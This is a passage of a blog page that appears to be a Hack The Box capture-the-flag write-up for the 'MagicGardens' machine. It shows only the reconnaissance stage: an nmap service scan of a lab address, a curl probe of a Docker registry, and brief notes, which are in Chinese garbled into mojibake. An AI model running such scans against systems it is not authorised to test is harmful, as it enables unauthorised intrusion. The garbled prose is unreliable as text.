<!DOCTYPE html>


<html theme="dark" showBanner="true" hasBanner="desktop" > 
<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/fontawesome.min.css" rel="stylesheet">
<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/brands.min.css" rel="stylesheet">
<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/solid.min.css" rel="stylesheet">
<script src="/js/color.global.min.js" ></script>
<script src="/js/load-settings.js" ></script>
<head>
  <meta charset="utf-8">
  
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-84TPQBH5EH"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-84TPQBH5EH');
</script>
<!-- End Google Analytics -->

  
  

  
  <title>ã€season-5ã€‘box magicgardens wp | Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="preload" href="/css/fonts/Roboto-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
  <link rel="preload" href="/css/fonts/Roboto-Bold.ttf" as="font" type="font/ttf" crossorigin="anonymous">

  <meta name="description" content="USERnmap1234567891011121314151617181920212223242526272829303132333435â””â”€$ sudo nmap -sS 10.129.104.149 -p22,25,80,1337,5000, -sV --min-rate&#x3D;3000Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2024-05-22">
<meta property="og:type" content="article">
<meta property="og:title" content="ã€season-5ã€‘box magicgardens wp">
<meta property="og:url" content="http://example.com/2024/05/30/box-magicgardens-wp/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="USERnmap1234567891011121314151617181920212223242526272829303132333435â””â”€$ sudo nmap -sS 10.129.104.149 -p22,25,80,1337,5000, -sV --min-rate&#x3D;3000Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2024-05-22">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/wpimages/2024/magicgardens/background.jpg">
<meta property="article:published_time" content="2024-05-30T06:48:37.000Z">
<meta property="article:modified_time" content="2024-08-23T08:40:31.943Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="wp">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/wpimages/2024/magicgardens/background.jpg">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-32.png" sizes="32x32">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-128.png" sizes="128x128">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-180.png" sizes="180x180">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-192.png" sizes="192x192">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-32.png" sizes="32x32">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-128.png" sizes="128x128">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-180.png" sizes="180x180">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-192.png" sizes="192x192">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 7.1.1"></head>

<body>
  
  
    
<div id="banner" class="">
  <img src="/images/backgroup.jpg" itemprop="image">
  <div id="banner-dim"></div>
</div>
 
   
  <div id="main-grid" class="  ">
    <div id="nav" class=""  >
      <navbar id="navbar">
  <nav id="title-nav">
    <a href="/">
      <div id="vivia-logo">
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
      </div>
      <div>Hexo </div>
    </a>
  </nav>
  <nav id="main-nav">
    
      <a class="main-nav-link" href="/">Home</a>
    
      <a class="main-nav-link" href="/about">About</a>
    
  </nav>
  <nav id="sub-nav">
    <a id="theme-btn" class="nav-icon">
      <span class="light-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M438.5-829.913v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-829.913Zm0 747.826v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-82.087ZM877.913-438.5h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537t29.476-12.174h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T877.913-438.5Zm-747.826 0h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T82.087-521.5h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T130.087-438.5Zm660.174-290.87-34.239 32q-12.913 12.674-29.565 12.174-16.653-.5-29.327-13.174-12.674-12.673-12.554-28.826.12-16.152 12.794-28.826l33-35q12.913-12.674 30.454-12.674t30.163 12.847q12.709 12.846 12.328 30.826-.38 17.98-13.054 30.653ZM262.63-203.978l-32 34q-12.913 12.674-30.454 12.674t-30.163-12.847q-12.709-12.846-12.328-30.826.38-17.98 13.054-30.653l33.239-31q12.913-12.674 29.565-12.174 16.653.5 29.327 13.174 12.674 12.673 12.554 28.826-.12 16.152-12.794 28.826Zm466.74 33.239-32-33.239q-12.674-12.913-12.174-29.565.5-16.653 13.174-29.327 12.673-12.674 28.826-13.054 16.152-.38 28.826 12.294l35 33q12.674 12.913 12.674 30.454t-12.847 30.163q-12.846 12.709-30.826 12.328-17.98-.38-30.653-13.054ZM203.978-697.37l-34-33q-12.674-12.913-13.174-29.945-.5-17.033 12.174-29.707t31.326-13.293q18.653-.62 31.326 13.054l32 34.239q11.674 12.913 11.174 29.565-.5 16.653-13.174 29.327-12.673 12.674-28.826 12.554-16.152-.12-28.826-12.794ZM480-240q-100 0-170-70t-70-170q0-100 70-170t170-70q100 0 170 70t70 170q0 100-70 170t-170 70Zm-.247-82q65.703 0 111.475-46.272Q637-414.544 637-480.247t-45.525-111.228Q545.95-637 480.247-637t-111.475 45.525Q323-545.95 323-480.247t45.525 111.975Q414.05-322 479.753-322ZM481-481Z"/></svg></span>
      <span class="dark-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M480.239-116.413q-152.63 0-258.228-105.478Q116.413-327.37 116.413-480q0-130.935 77.739-227.435t206.304-125.043q43.022-9.631 63.87 10.869t3.478 62.805q-8.891 22.043-14.315 44.463-5.424 22.42-5.424 46.689 0 91.694 64.326 155.879 64.325 64.186 156.218 64.186 24.369 0 46.978-4.946 22.609-4.945 44.413-14.076 42.826-17.369 62.967 1.142 20.142 18.511 10.511 61.054Q807.174-280 712.63-198.206q-94.543 81.793-232.391 81.793Zm0-95q79.783 0 143.337-40.217 63.554-40.218 95.793-108.283-15.608 4.044-31.097 5.326-15.49 1.283-31.859.805-123.706-4.066-210.777-90.539-87.071-86.473-91.614-212.092-.24-16.369.923-31.978 1.164-15.609 5.446-30.978-67.826 32.478-108.282 96.152Q211.652-559.543 211.652-480q0 111.929 78.329 190.258 78.329 78.329 190.258 78.329ZM466.13-465.891Z"/></svg></span>
    </a>
    
      <a id="nav-rss-link" class="nav-icon mobile-hide" href="/atom.xml" title="RSS Feed">
        <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M198-120q-25.846 0-44.23-18.384-18.384-18.385-18.384-44.23 0-25.846 18.384-44.23 18.384-18.385 44.23-18.385 25.846 0 44.23 18.385 18.384 18.384 18.384 44.23 0 25.845-18.384 44.23Q223.846-120 198-120Zm538.385 0q-18.846 0-32.923-13.769-14.076-13.769-15.922-33.23-8.692-100.616-51.077-188.654-42.385-88.039-109.885-155.539-67.5-67.501-155.539-109.885Q283-663.462 182.385-672.154q-19.461-1.846-33.23-16.23-13.769-14.385-13.769-33.846t14.076-32.922q14.077-13.461 32.923-12.23 120.076 8.692 226.038 58.768 105.961 50.077 185.73 129.846 79.769 79.769 129.846 185.731 50.077 105.961 58.769 226.038 1.231 18.846-12.538 32.922Q756.461-120 736.385-120Zm-252 0q-18.231 0-32.423-13.461t-18.653-33.538Q418.155-264.23 348.886-333.5q-69.27-69.27-166.501-84.423-20.077-4.462-33.538-18.961-13.461-14.5-13.461-33.346 0-19.076 13.884-33.23 13.884-14.153 33.115-10.922 136.769 15.384 234.384 112.999 97.615 97.615 112.999 234.384 3.231 19.23-10.538 33.115Q505.461-120 484.385-120Z"/></svg>
      </a>
    
    <div id="nav-menu-btn" class="nav-icon">
      <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M177.37-252.282q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Zm0-186.218q-17.453 0-29.477-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T177.37-521.5h605.26q17.453 0 29.477 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T782.63-438.5H177.37Zm0-186.217q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Z"/></svg>
    </div>
  </nav>
</navbar>
<div id="nav-dropdown" class="hidden">
  <div id="dropdown-link-list">
    
      <a class="nav-dropdown-link" href="/">Home</a>
    
      <a class="nav-dropdown-link" href="/about">About</a>
    
    
      <a class="nav-dropdown-link" href="/atom.xml" title="RSS Feed">RSS</a>
     
    </div>
</div>
<script>
  let dropdownBtn = document.getElementById("nav-menu-btn");
  let dropdownEle = document.getElementById("nav-dropdown");
  dropdownBtn.onclick = function() {
    dropdownEle.classList.toggle("hidden");
  }
</script>
    </div>
    <div id="sidebar-wrapper">
      <sidebar id="sidebar">
  
    <div class="widget-wrap">
  <div class="info-card">
    <div class="avatar">
      
        <image src=/images/avatar.jpg></image>
      
      <div class="img-dim"></div>
    </div>
    <div class="info">
      <div class="username">Flower </div>
      <div class="dot"></div>
      <div class="subtitle">Hi Im Flower </div>
      <div class="link-list">
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://twitter.com" title="Twitter"><i class="fa-brands fa-twitter"></i></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://store.steampowered.com" title="Steam"><i class="fa-brands fa-steam"></i></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com" title="GitHub"><i class="fa-brands fa-github"></i></a>
         
      </div>  
    </div>
  </div>
</div>

  
    
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Tags</h3>
      <ul class="widget-tag-list" itemprop="keywords"><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/AD/" rel="tag">AD</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/AS-REQ-ST/" rel="tag">AS-REQ ST</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/AllowedtoAct/" rel="tag">AllowedtoAct</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/C/" rel="tag">C++</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CVE-2024-36467/" rel="tag">CVE-2024-36467</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CVE-2024-42327/" rel="tag">CVE-2024-42327</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/DACL/" rel="tag">DACL</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Forensic/" rel="tag">Forensic</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/LFI/" rel="tag">LFI</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Nmap/" rel="tag">Nmap</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PasstheCert/" rel="tag">PasstheCert</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SQL-injection/" rel="tag">SQL injection</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Tips/" rel="tag">Tips</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Zabbix/" rel="tag">Zabbix</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ansible-vault/" rel="tag">ansible_vault</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/aws/" rel="tag">aws</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/azure-devops/" rel="tag">azure devops</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/azureAD/" rel="tag">azureAD</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/blockchain/" rel="tag">blockchain</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/brute-rid/" rel="tag">brute-rid</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bypass-kerberos-only/" rel="tag">bypass-kerberos-only</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/cd/" rel="tag">cd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/consul/" rel="tag">consul</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/deb/" rel="tag">deb</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/dpapi/" rel="tag">dpapi</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/edge/" rel="tag">edge</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/esc1/" rel="tag">esc1</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/fishing/" rel="tag">fishing</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/gamepwn/" rel="tag">gamepwn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ghost/" rel="tag">ghost</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/h2/" rel="tag">h2</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/jwt/" rel="tag">jwt</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/k8s/" rel="tag">k8s</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/kcd/" rel="tag">kcd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ldap/" rel="tag">ldap</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/limesurvey/" rel="tag">limesurvey</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/mail/" rel="tag">mail</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/merge/" rel="tag">merge</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/nginx/" rel="tag">nginx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/no-preAuth/" rel="tag">no-preAuth</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/nodejs/" rel="tag">nodejs</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/poc/" rel="tag">poc</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pod/" rel="tag">pod</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pods/" rel="tag">pods</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pre2k/" rel="tag">pre2k</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rbcd/" rel="tag">rbcd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/remote-potato/" rel="tag">remote-potato</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rootkit/" rel="tag">rootkit</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rosating/" rel="tag">rosating</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/s3/" rel="tag">s3</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sercerts/" rel="tag">sercerts</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sherlocks/" rel="tag">sherlocks</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ssti/" rel="tag">ssti</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/study/" rel="tag">study</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/svn/" rel="tag">svn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/symlink/" rel="tag">symlink</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/winlogon/" rel="tag">winlogon</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/%E5%AE%9E%E4%BE%8B%E8%AE%B0%E5%BD%95/" rel="tag">å®ä¾‹è®°å½•</a></li></ul>
    </div>
  </div>


  
  <div class="sticky">
    
      


  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Categories</h3>
      <div class="category-box">
            <a class="category-link" href="/categories/cloud/">
                cloud
                <div class="category-count">7</div>
            </a>
        
            <a class="category-link" href="/categories/htb-Season-5/">
                htb-Season-5
                <div class="category-count">7</div>
            </a>
        
            <a class="category-link" href="/categories/htb-Season-6/">
                htb-Season-6
                <div class="category-count">10</div>
            </a>
        
            <a class="category-link" href="/categories/htb-Season-4/">
                htb-Season-4
                <div class="category-count">3</div>
            </a>
        
            <a class="category-link" href="/categories/ctf/">
                ctf
                <div class="category-count">7</div>
            </a>
        
            <a class="category-link" href="/categories/Sherlocks/">
                Sherlocks
                <div class="category-count">1</div>
            </a>
        
            <a class="category-link" href="/categories/AD/">
                AD
                <div class="category-count">3</div>
            </a>
        
            <a class="category-link" href="/categories/CVE/">
                CVE
                <div class="category-count">1</div>
            </a>
        
            <a class="category-link" href="/categories/forensic/">
                forensic
                <div class="category-count">2</div>
            </a>
        </div>
    </div>
  </div>


    
      
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Recent Posts</h3>
      <ul>
        
          <a class="recent-link" href="/2024/12/26/Tracks-AD-Support/" title="Tracks-AD-Support" >
            <div class="recent-link-text">
              Tracks-AD-Support
            </div>
          </a>
        
          <a class="recent-link" href="/2024/12/26/Tracks-AD-Authority/" title="Tracks-AD-Authority" >
            <div class="recent-link-text">
              Tracks-AD-Authority
            </div>
          </a>
        
          <a class="recent-link" href="/2024/12/20/crtp-study-note/" title="crtp-study-note" >
            <div class="recent-link-text">
              crtp-study-note
            </div>
          </a>
        
          <a class="recent-link" href="/2024/12/20/Sherlocks-Blizzard-Breakdown/" title="ã€Sherlocksã€‘Blizzard-Breakdown" >
            <div class="recent-link-text">
              ã€Sherlocksã€‘Blizzard-Breakdown
            </div>
          </a>
        
          <a class="recent-link" href="/2024/12/19/Sherlocks-Cookie-Consumption/" title="ã€Sherlocksã€‘Cookie-Consumption" >
            <div class="recent-link-text">
              ã€Sherlocksã€‘Cookie-Consumption
            </div>
          </a>
        
      </ul>
    </div>
  </div>

    
  </div>
</sidebar>
    </div>
    <div id="content-body">
       


<article id="post-box-magicgardens-wp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
    
<div class="article-gallery">
  <div class="article-gallery-photos">
    
      <a class="article-gallery-img" rel="gallery_cm4gvs8g1002vzoky2yc6ggos">
        <img src="/wpimages/2024/magicgardens/background.jpg" itemprop="image">
      </a>
    
  </div>
</div>

   
  <div class="article-inner">
    <div class="article-main">
      <header class="article-header">
        
<div class="main-title-bar">
  <div class="main-title-dot"></div>
  
    
      <h1 class="p-name article-title" itemprop="headline name">
        ã€season-5ã€‘box magicgardens wp
      </h1>
    
  
</div>

        <div class='meta-info-bar'>
          <div class="meta-info">
  <time class="dt-published" datetime="2024-05-30T06:48:37.000Z" itemprop="datePublished">2024-05-30</time>
</div>
          <div class="need-seperator meta-info">
            <div class="meta-cate-flex">
  
  <a class="meta-cate-link" href="/categories/htb-Season-5/">htb-Season-5</a>
   
</div>
  
          </div>
          <div class="wordcount need-seperator meta-info">
            25k words 
          </div>
        </div>
        
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

      </header>
      <div class="e-content article-entry" itemprop="articleBody">
        
          <h2 id="USER"><a href="#USER" class="headerlink" title="USER"></a>USER</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ sudo nmap -sS 10.129.104.149 -p22,25,80,1337,5000, -sV --min-rate=3000</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-22 05:42 EDT</span><br><span class="line">Stats: 0:01:01 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan</span><br><span class="line">Service scan Timing: About 60.00% <span class="keyword">done</span>; ETC: 05:44 (0:00:40 remaining)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.129.104.149 (10.129.104.149)</span><br><span class="line">Host is up (0.47s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE  VERSION</span><br><span class="line">22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)</span><br><span class="line">25/tcp   open  smtp?</span><br><span class="line">80/tcp   open  http     nginx 1.22.1</span><br><span class="line">1337/tcp open  waste?</span><br><span class="line">5000/tcp open  ssl/http Docker Registry (API: 2.0)</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port1337-TCP:V=7.94SVN%I=7%D=5/22%Time=664DBE1E%P=x86_64-pc-linux-gnu%r</span><br><span class="line">SF:(GenericLines,15,<span class="string">&quot;\[x\]\x20Handshake\x20error\n\0&quot;</span>)%r(GetRequest,15,<span class="string">&quot;\[</span></span><br><span class="line"><span class="string">SF:x\]\x20Handshake\x20error\n\0&quot;</span>)%r(HTTPOptions,15,<span class="string">&quot;\[x\]\x20Handshake\x2</span></span><br><span class="line"><span class="string">SF:0error\n\0&quot;</span>)%r(RTSPRequest,15,<span class="string">&quot;\[x\]\x20Handshake\x20error\n\0&quot;</span>)%r(RPCC</span><br><span class="line">SF:heck,15,<span class="string">&quot;\[x\]\x20Handshake\x20error\n\0&quot;</span>)%r(DNSVersionBindReqTCP,15,<span class="string">&quot;\</span></span><br><span class="line"><span class="string">SF:[x\]\x20Handshake\x20error\n\0&quot;</span>)%r(DNSStatusRequestTCP,15,<span class="string">&quot;\[x\]\x20Han</span></span><br><span class="line"><span class="string">SF:dshake\x20error\n\0&quot;</span>)%r(Help,15,<span class="string">&quot;\[x\]\x20Handshake\x20error\n\0&quot;</span>)%r(Te</span><br><span class="line">SF:rminalServerCookie,15,<span class="string">&quot;\[x\]\x20Handshake\x20error\n\0&quot;</span>)%r(X11Probe,15,</span><br><span class="line">SF:<span class="string">&quot;\[x\]\x20Handshake\x20error\n\0&quot;</span>)%r(FourOhFourRequest,15,<span class="string">&quot;\[x\]\x20Han</span></span><br><span class="line"><span class="string">SF:dshake\x20error\n\0&quot;</span>)%r(LPDString,15,<span class="string">&quot;\[x\]\x20Handshake\x20error\n\0&quot;</span>)</span><br><span class="line">SF:%r(LDAPSearchReq,15,<span class="string">&quot;\[x\]\x20Handshake\x20error\n\0&quot;</span>)%r(LDAPBindReq,15</span><br><span class="line">SF:,<span class="string">&quot;\[x\]\x20Handshake\x20error\n\0&quot;</span>)%r(LANDesk-RC,15,<span class="string">&quot;\[x\]\x20Handshake</span></span><br><span class="line"><span class="string">SF:\x20error\n\0&quot;</span>)%r(TerminalServer,15,<span class="string">&quot;\[x\]\x20Handshake\x20error\n\0&quot;</span>)%</span><br><span class="line">SF:r(NCP,15,<span class="string">&quot;\[x\]\x20Handshake\x20error\n\0&quot;</span>)%r(NotesRPC,15,<span class="string">&quot;\[x\]\x20Han</span></span><br><span class="line"><span class="string">SF:dshake\x20error\n\0&quot;</span>)%r(JavaRMI,15,<span class="string">&quot;\[x\]\x20Handshake\x20error\n\0&quot;</span>)%r</span><br><span class="line">SF:(ms-sql-s,15,<span class="string">&quot;\[x\]\x20Handshake\x20error\n\0&quot;</span>)%r(afp,15,<span class="string">&quot;\[x\]\x20Hand</span></span><br><span class="line"><span class="string">SF:shake\x20error\n\0&quot;</span>)%r(giop,15,<span class="string">&quot;\[x\]\x20Handshake\x20error\n\0&quot;</span>);</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 191.92 seconds</span><br></pre></td></tr></table></figure>

<p>å…ˆç®€å•è®¿é—®ä¸‹ç«¯å£çœ‹çœ‹éƒ½æ˜¯ä»€ä¹ˆæœåŠ¡</p>
<h4 id="1337"><a href="#1337" class="headerlink" title="1337"></a>1337</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[x] Handshake error</span><br><span class="line">ï¿½</span><br></pre></td></tr></table></figure>

<h4 id="5000"><a href="#5000" class="headerlink" title="5000"></a>5000</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ curl -s -k https://10.129.104.149:5000/v2/_catalog|jq</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;errors&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;code&quot;</span>: <span class="string">&quot;UNAUTHORIZED&quot;</span>,</span><br><span class="line">      <span class="string">&quot;message&quot;</span>: <span class="string">&quot;authentication required&quot;</span>,</span><br><span class="line">      <span class="string">&quot;detail&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="string">&quot;Type&quot;</span>: <span class="string">&quot;registry&quot;</span>,</span><br><span class="line">          <span class="string">&quot;Class&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">          <span class="string">&quot;Name&quot;</span>: <span class="string">&quot;catalog&quot;</span>,</span><br><span class="line">          <span class="string">&quot;Action&quot;</span>: <span class="string">&quot;*&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>80 å°±æ˜¯ä¸ªhttpäº†</p>
<hr>
<p>å› ä¸º5000æœ‰è®¤è¯æ²¡æ³•è®¿é—®</p>
<p>æ‰€ä»¥çªç ´é‡å¿ƒè¿˜æ˜¯æ”¾åœ¨äº†web</p>
<p>æˆ‘å…ˆæ‰«äº†ä¸€å“ˆvhostå’Œwebdirï¼Œvhostæ²¡æ”¶è·ï¼Œdirå€’æ˜¯çˆ†å‡ºæ¥ä¸ªdjango</p>
